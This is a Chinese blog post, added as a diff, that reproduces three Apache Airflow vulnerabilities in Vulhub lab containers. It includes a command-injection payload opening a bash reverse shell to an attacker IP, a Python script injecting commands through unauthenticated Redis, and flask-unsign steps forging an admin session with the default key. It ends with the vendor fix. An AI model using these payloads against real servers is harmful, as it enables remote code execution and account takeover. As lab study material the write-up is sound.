@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>airflow | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）简介介绍​        Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="airflow">
+<meta property="og:url" content="http://example.com/2023/11/01/airflow/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）简介介绍​        Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101204555068.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101204659247.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101204749335.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101205213375.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101205828358.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101210640628.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101211029904.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101211130489.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101211321558.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101211420943.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101215431250.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101215521575.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101215924748.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101215954665.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231101221138004.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231106110135569.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231106111509260.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231106111625102.png">
+<meta property="og:image" content="http://example.com/2023/11/01/airflow/image-20231106111926606.png">
+<meta property="article:published_time" content="2023-11-01T11:59:46.000Z">
+<meta property="article:modified_time" content="2023-11-06T03:20:53.229Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="airflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/01/airflow/image-20231101204555068.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-airflow" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/11/01/airflow/" class="article-date">
+  	<time datetime="2023-11-01T11:59:46.000Z" itemprop="datePublished">2023-11-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      airflow
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/airflow/" rel="tag">airflow</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）"><a href="#Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）" class="headerlink" title="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）"></a>Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​        Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。</p>
+<p>​        这个平台拥有和 Hive、Presto、MySQL、HDFS、Postgres 等数据源之间交互的能力，并且提供了钩子（hook）使其拥有很好地扩展性。除了一个命令行界面，该工具还提供了一个基于 Web 的用户界面可以可视化管道的依赖关系、监控进度、触发任务等。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Airflow &lt;= 1.10.10</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>依次执行如下命令启动airflow 1.10.10：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#初始化数据库</span><br><span class="line">docker compose run airflow-init</span><br><span class="line">#启动服务</span><br><span class="line">docker compose up -d</span><br><span class="line">#查看容器对应端口</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>在<code>http://your-ip:8080</code>即可查看到相关页面</p>
+<p><img src="image-20231101204555068.png" alt="image-20231101204555068"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.访问<code>http://your-ip:8080</code>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p>
+<p><img src="image-20231101204659247.png" alt="image-20231101204659247"></p>
+<p>2.进入example_trigger_target_dag页面，点击Trigger DAG，进入到调试页面。</p>
+<p><img src="image-20231101204749335.png" alt="image-20231101204749335"></p>
+<p>3.在Configuration JSON中输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;touch &#x2F;tmp&#x2F;hack;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101205213375.png" alt="image-20231101205213375"></p>
+<p>4.再点<code>Trigger</code>执行dag</p>
+<p>等几秒可以看到执行成功：</p>
+<p><img src="image-20231101205828358.png" alt="image-20231101205828358"></p>
+<p>5.进入容器查看目录，发现成功创建/tmp/hack文件，漏洞复现成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockercompose exec airflow-worker bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101210640628.png" alt="image-20231101210640628"></p>
+<p>6.利用这个漏洞进行反弹shell</p>
+<p>攻击机开启nc，监听7777端口</p>
+<p><img src="image-20231101211029904.png" alt="image-20231101211029904"></p>
+<p>7.在Configuration JSON中输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.139&#x2F;7777 0&gt;&amp;1;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101211130489.png" alt="image-20231101211130489"></p>
+<p>再点击Trigger执行dag，去查看对应的攻击机nc</p>
+<p><img src="image-20231101211321558.png" alt="image-20231101211321558"></p>
+<p>成功反弹shell，可以命令执行</p>
+<p><img src="image-20231101211420943.png" alt="image-20231101211420943"></p>
+<h1 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）"><a href="#Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）" class="headerlink" title="Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）"></a>Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>​        Apache Airflow是一款开源的，分布式任务调度框架。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>​        Apache Airflow &lt;= 1.10.10</p>
+<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis/RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>依次执行如下命令启动airflow 1.10.10</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#初始化数据库</span><br><span class="line">docker compose run airflow-init</span><br><span class="line"></span><br><span class="line">#启动服务</span><br><span class="line">docker compose up -d</span><br><span class="line"></span><br><span class="line">#查看端口</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。</p>
+<p>1.可以使用exploit_airflow_celery.py这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">python exploit_airflow_celery.py [your-ip]</span><br></pre></td></tr></table></figure>
+
+<p>exploit_airflow_celery.py:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">r &#x3D; redis.Redis(host&#x3D;sys.argv[1], port&#x3D;6379, decode_responses&#x3D;True,db&#x3D;0) </span><br><span class="line">queue_name &#x3D; &#39;default&#39;</span><br><span class="line">ori_str&#x3D;&quot;&#123;\&quot;content-encoding\&quot;: \&quot;utf-8\&quot;, \&quot;properties\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;delivery_tag\&quot;: \&quot;f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;\&quot;&#125;, \&quot;reply_to\&quot;: \&quot;fb996eec-3033-3c10-9ee1-418e1ca06db8\&quot;&#125;, \&quot;content-type\&quot;: \&quot;application&#x2F;json\&quot;, \&quot;headers\&quot;: &#123;\&quot;retries\&quot;: 0, \&quot;lang\&quot;: \&quot;py\&quot;, \&quot;argsrepr\&quot;: \&quot;(100, 200)\&quot;, \&quot;expires\&quot;: null, \&quot;task\&quot;: \&quot;airflow.executors.celery_executor.execute_command\&quot;, \&quot;kwargsrepr\&quot;: \&quot;&#123;&#125;\&quot;, \&quot;root_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;parent_id\&quot;: null, \&quot;id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;origin\&quot;: \&quot;gen1@132f65270cde\&quot;, \&quot;eta\&quot;: null, \&quot;group\&quot;: null, \&quot;timelimit\&quot;: [null, null]&#125;, \&quot;body\&quot;: \&quot;W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ&#x3D;&#x3D;\&quot;&#125;&quot;</span><br><span class="line">task_dict &#x3D; json.loads(ori_str)</span><br><span class="line">command &#x3D; [&#39;touch&#39;, &#39;&#x2F;tmp&#x2F;airflow_celery_success&#39;]</span><br><span class="line">body&#x3D;[[command], &#123;&#125;, &#123;&quot;chain&quot;: None, &quot;chord&quot;: None, &quot;errbacks&quot;: None, &quot;callbacks&quot;: None&#125;]</span><br><span class="line">task_dict[&#39;body&#39;]&#x3D;base64.b64encode(json.dumps(body).encode()).decode()</span><br><span class="line">print(task_dict)</span><br><span class="line">r.lpush(queue_name,json.dumps(task_dict))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.查看结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose logs airflow-worker</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231101215431250.png" alt="image-20231101215431250"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose exec airflow-worker ls -l &#x2F;tmp</span><br></pre></td></tr></table></figure>
+
+<p>3.可以看到成功创建了文件<code>airflow_celery_success</code>：</p>
+<p><img src="image-20231101215521575.png" alt="image-20231101215521575"></p>
+<p>4.修改脚本command，显示信息，如whoami</p>
+<p><img src="image-20231101215924748.png" alt="image-20231101215924748"></p>
+<p>5.回到服务端查看</p>
+<p><img src="image-20231101215954665.png" alt="image-20231101215954665"></p>
+<h1 id="Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）"><a href="#Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）" class="headerlink" title="Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）"></a>Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>​        Apache Airflow是python语言编写的一个以编程方式创作、安排和监控工作流程的平台。<br>​        除了几个服务器端 python 脚本之外，它还有一个基于Flask编写的Web应用程序，该Web 应用程序 使用Flask 的无状态签名 cookie 来存储和管理成功的身份验证。在安装过程中，可以使用Airflow命令创建用户，在文档中该用户是具有管理员角色的用户。任何后续用户都可以使用Airflow python 脚本从 Web 界面或命令行创建。</p>
+<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>​        Airflow&lt;=1.10.13版本</p>
+<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​        在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。</p>
+<p>​        CVE-2020-17526漏洞成因是：<br>​            由于使用默认安全密钥对身份验证信息进行签名，导致安全配置错误。当用户登录时，会设置一个名为session的 cookie ，其中包含 json 格式的用户认证信息。json 中名为user_id的密钥标识了登录的用户。此 json 使用在airflow.cfg配置文件中配置的字符串进行签名。在 1.10.15 和 2.0.2 版本之前，此字符串设置为temporary_key。官方文档和安装消息都没有说明更改此密钥。</p>
+<p>​        默认密钥为temporary_key造成的问题：<br>​            攻击者可以创建与目标相同版本的本地安装，以管理员身份登录并将会话cookie重播到目标以在远程计算机上以管理员身份登录。<br>在这种情况下，可以使用工具来解密和识别明文 json 字符串，然后更新user_id参数并将 cookie 重新发送到服务器以模拟指定了user_id的用户。</p>
+<p>​        curl -v url：显示url的整个响应过程<br>​        flask-unisign解释：上文提到web程序是基于Flask编写，Flask cookie 是经过签名而不是加密的，因此获得会话 cookie 后，可以尝试暴力破解服务器的密钥。</p>
+<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Apache Airflow 1.10.10服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#初始化数据库</span><br><span class="line">docker compose run airflow-init</span><br><span class="line"></span><br><span class="line">#启动服务</span><br><span class="line">docker compose up -d</span><br><span class="line"></span><br><span class="line">#查看端口</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>服务器启动后，访问<code>http://your-ip:8080</code>即可查看到登录页面。</p>
+<p><img src="image-20231101221138004.png" alt="image-20231101221138004"></p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.访问登录页面，服务器会返回一个签名后的Cookie：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;localhost:8080&#x2F;admin&#x2F;airflow&#x2F;login</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231106110135569.png" alt="image-20231106110135569"></p>
+<p>2.使用flask-unsign这个工具来爆破签名时使用的SECRET_KEY</p>
+<p>安装<code>flask-unsign</code>工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign[wordlist]</span><br><span class="line">pip3 install flask-unsign</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -u -c eyJjc3JmX3Rva2VuIjoiNDM4MWFiODkzOGRmZjBkZWJlN2I4M2IzZThkZTU4YjQ5M2I3NTdmNCJ9.ZUhW-g.UME26lFEoeK_HgZ2oyKwxfuPlk0</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231106111509260.png" alt="image-20231106111509260"></p>
+<p>成功爆破出Key是<code>temporary_key</code>。使用这个key生成一个新的session，其中伪造<code>user_id</code>为1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret temporary_key -c &quot;&#123;&#39;user_id&#39;: &#39;1&#39;, &#39;_fresh&#39;: False, &#39;_permanent&#39;: True&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231106111625102.png" alt="image-20231106111625102"></p>
+<p>在浏览器中使用这个新生成的session，可见已成功登录：</p>
+<p><img src="image-20231106111926606.png" alt="image-20231106111926606"></p>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>​        CVE-2020-17526 在版本 1.10.15 和 2.0.2 中通过删除静态字符串并添加b64encode(os.urandom(16)).decode(‘utf-8’)以生成随机字符串作为密钥进行修复Web 应用程序服务器将用于身份验证。此外，如果发现密钥是临时键，则将以下代码添加到 webserver 命令模块以关闭服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if conf.get(&#39;webserver&#39;, &#39;secret_key&#39;) &#x3D;&#x3D; &#39;temporary_key&#39;:</span><br><span class="line">	from rich import print as rich_print</span><br><span class="line"></span><br><span class="line">	rich_print(</span><br><span class="line">		&quot;[red][bold]ERROR:[&#x2F;bold] The &#96;secret_key&#96; setting under the webserver config has an insecure &quot;</span><br><span class="line">		&quot;value - Airflow has failed safe and refuses to start. Please change this value to a new, &quot;</span><br><span class="line">		&quot;per-environment, randomly generated string, for example using this command &#96;[cyan]openssl rand &quot;</span><br><span class="line">		&quot;-hex 30[&#x2F;cyan]&#96;&quot;,</span><br><span class="line">		file&#x3D;sys.stderr,</span><br><span class="line">	)</span><br><span class="line">	sys.exit(1)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/06/apache-druid-apereo-cas/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          apache-druid--apereo-cas
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/31/adminer/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">adminer</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
